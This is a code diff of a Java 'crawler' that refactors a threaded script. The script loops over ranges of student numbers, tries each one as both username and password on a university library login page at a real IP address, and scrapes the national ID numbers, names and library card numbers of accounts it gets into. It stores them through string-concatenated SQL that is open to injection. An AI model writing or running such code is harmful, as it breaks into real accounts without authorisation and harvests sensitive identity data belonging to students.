@@ -9,7 +9,30 @@ import java.util.regex.Pattern;
 
 public class Lab {
     public static void main(String[] args) throws IOException {
+        System.out.println("启动爬虫");
+        Lab lab = new Lab();
+        lab.init();
 
+    }
+
+    public void init() {
+        new LabThread(2012010000,2012020000);
+    }
+
+}
+
+class LabThread implements Runnable {
+
+    int start = 0;
+    int end = 0;
+
+    public LabThread(int start, int end) {
+        this.start = start;
+        this.end = end;
+        new Thread(this).start();
+    }
+
+    public void run() {
         String url = "http://211.70.171.1/list/dzjs/login.asp";
 
         String urlnext = "http://211.70.171.1/list/dzjs/login_form.asp";
@@ -18,20 +41,37 @@ public class Lab {
 
         DB db = new DB();
 
+        int sum = 0;
+
         long t = System.currentTimeMillis();
 
-        for(long i = 2008009500; i <= 2018000000; i++) {
+        for(long i = start; i <= end; i++) {
 
             String param = Long.toString(i);
 
-            String query = String.format("user=%s&pw=%s", URLEncoder.encode(param, charset), URLEncoder.encode(param, charset));
+            String query = null;
+            try {
+                query = String.format("user=%s&pw=%s", URLEncoder.encode(param, charset), URLEncoder.encode(param, charset));
+            } catch (UnsupportedEncodingException e) {
+                e.printStackTrace();
+            }
 
             CookieHandler.setDefault(new CookieManager(null, CookiePolicy.ACCEPT_ALL));
 
 
-            URLConnection connection = new URL(url + "?" + query).openConnection();
+            URLConnection connection = null;
+            try {
+                connection = new URL(url + "?" + query).openConnection();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
 
-            BufferedReader buf = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            BufferedReader buf = null;
+            try {
+                buf = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
             String line = null;
 
             String warn = "错误";
@@ -39,10 +79,14 @@ public class Lab {
 
 
             int warni = 0;
-            while ((line = buf.readLine()) != null) {
-                Matcher w = warnP.matcher(line);
-                if(w.find())
-                    warni ++;
+            try {
+                while ((line = buf.readLine()) != null) {
+                    Matcher w = warnP.matcher(line);
+                    if(w.find())
+                        warni ++;
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
             }
 
             if(warni == 1) {
@@ -54,11 +98,20 @@ public class Lab {
 
             List<String> cookies = connection.getHeaderFields().get("Set-Cookie");
 
-            connection = new URL(urlnext).openConnection();
+            try {
+                connection = new URL(urlnext).openConnection();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
 
-            BufferedReader bufr = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            BufferedReader bufr = null;
+            try {
+                bufr = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
 
-//            String line = null;
+            //String line = null;
 
             String Idcard = "\\d{17}\\S";
             String name = "【(\\S+)】";
@@ -75,37 +128,42 @@ public class Lab {
             int cardflag = 0;
             int exist = 0;
 
-            while ((line = bufr.readLine()) != null) {
-//                System.out.println(line);
+            try {
+                while ((line = bufr.readLine()) != null) {
+                    //System.out.println(line);
 
-                Matcher m = IdcardP.matcher(line);
-                if (m.find()) {
-                    System.out.print("身份证" + m.group());
-                    IdcardD = m.group();
-                    exist ++;
-                }
-
-                Matcher n = nameP.matcher(line);
-                if (n.find()) {
-                    System.out.print("学号" + i + "\t" + "姓名" + n.group(1) +"\t");
-                    nameD = n.group(1);
-                    exist ++;
-                }
-
-                Matcher j = libnumP.matcher(line);
-                if(j.find()) {
-                    if(cardflag == 1) {
-                        libnumD = j.group(1);
-                        System.out.print("\t" + "卡号" + libnumD + "\t");
+                    Matcher m = IdcardP.matcher(line);
+                    if (m.find()) {
+                        System.out.print("身份证" + m.group());
+                        IdcardD = m.group();
+                        exist ++;
                     }
-                    cardflag ++;
-                    exist ++;
+
+                    Matcher n = nameP.matcher(line);
+                    if (n.find()) {
+                        System.out.print("学号" + i + "\t" + "姓名" + n.group(1) +"\t");
+                        nameD = n.group(1);
+                        exist ++;
+                    }
+
+                    Matcher j = libnumP.matcher(line);
+                    if(j.find()) {
+                        if(cardflag == 1) {
+                            libnumD = j.group(1);
+                            System.out.print("\t" + "卡号" + libnumD + "\t");
+                        }
+                        cardflag ++;
+                        exist ++;
+                    }
                 }
+            } catch (IOException e) {
+                e.printStackTrace();
             }
-            if(exist >= 2)
-            db.insert(i,nameD,libnumD,IdcardD);
+            if(exist >= 2) {
+                System.out.print("有效" + sum++);
+                db.insert(i, nameD, libnumD, IdcardD);
+            }
         }
-        System.out.println(System.currentTimeMillis() - t);
     }
 
 }
@@ -122,7 +180,7 @@ class DB {
     Statement stmt = null;
 
     //insert data
-    public  void insert(long data1, String data2, String data3, String data4) {
+    public synchronized void insert(long data1, String data2, String data3, String data4) {
 
         try{
             //Register JDBC driver, maybe userful
@@ -134,7 +192,7 @@ class DB {
             //Execute a query
             stmt = conn.createStatement();
 
-            String sql = "INSERT INTO lib " +
+            String sql = "INSERT INTO lib_copy " +
                     "VALUES (" + data1 +",'"+ data2+"'," + data3 +",'"+data4+"')";
 
             stmt.executeUpdate(sql);
